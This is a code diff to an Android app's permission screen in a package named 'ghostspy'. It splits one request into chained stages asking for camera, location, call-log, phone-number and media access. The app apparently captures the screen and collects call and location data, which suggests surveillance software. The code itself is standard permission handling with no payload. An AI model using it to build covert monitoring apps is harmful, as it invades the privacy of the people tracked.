@@ -26,6 +26,8 @@ import com.spy.ghostspy.services.ScreenCaptureForegroundService;
 
 public class PermissionSetActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CAMERA = 1001;
+    private static final int PERMISSION_REQUEST_PHONE = 1002;
+    private static final int PERMISSION_REQUEST_MEDIA = 1003;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -47,31 +49,38 @@ public class PermissionSetActivity extends AppCompatActivity {
         }
     }
     private void onRequestPermission() {
+        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA, Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CAMERA );
+    }
+
+    private void onRequestPermissionPhone() {
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.CAMERA,
-//                    Manifest.permission.RECORD_AUDIO,
-                    Manifest.permission.READ_MEDIA_IMAGES,
-                    Manifest.permission.ACCESS_COARSE_LOCATION,
-                    Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.PROCESS_OUTGOING_CALLS,
                     Manifest.permission.READ_PHONE_NUMBERS,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.WRITE_CALL_LOG,
-                    Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CAMERA);
+                    Manifest.permission.WRITE_CALL_LOG}, PERMISSION_REQUEST_PHONE);
         } else {
             ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.CAMERA,
-//                    Manifest.permission.RECORD_AUDIO,
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.ACCESS_COARSE_LOCATION,
-                    Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.PROCESS_OUTGOING_CALLS,
                     Manifest.permission.READ_PHONE_NUMBERS,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.WRITE_CALL_LOG}, PERMISSION_REQUEST_CAMERA);
+                    Manifest.permission.WRITE_CALL_LOG}, PERMISSION_REQUEST_PHONE);
+        }
+    }
+
+    private void onRequestPermissionMedia() {
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ActivityCompat.requestPermissions(this, new String[]{
+//                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_MEDIA_IMAGES,
+                    Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_MEDIA);
+        } else {
+            ActivityCompat.requestPermissions(this, new String[]{
+//                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_MEDIA);
         }
     }
 
@@ -79,29 +88,19 @@ public class PermissionSetActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         if (requestCode == PERMISSION_REQUEST_CAMERA) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                onRequestPermissionPhone();
+            }
+        } else if (requestCode == PERMISSION_REQUEST_PHONE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                onRequestPermissionMedia();
+            }
+        } else if (requestCode == PERMISSION_REQUEST_MEDIA) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 Intent intent = new Intent(this, CaptureActivity.class);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
                 finish();
             }
-//            boolean allPermissionsGranted = true;
-//            for (int result : grantResults) {
-//                if (result != PackageManager.PERMISSION_GRANTED) {
-//                    allPermissionsGranted = false;
-//                    break;
-//                }
-//            }
-//
-//            if (allPermissionsGranted) {
-//                // Permissions are granted, proceed to start the activity
-//                Intent intent = new Intent(this, CaptureActivity.class);
-//                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-//                startActivity(intent);
-//                finish();
-//            } else {
-//                // Permission(s) denied
-//                onRequestPermission();
-//            }
         }
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     }
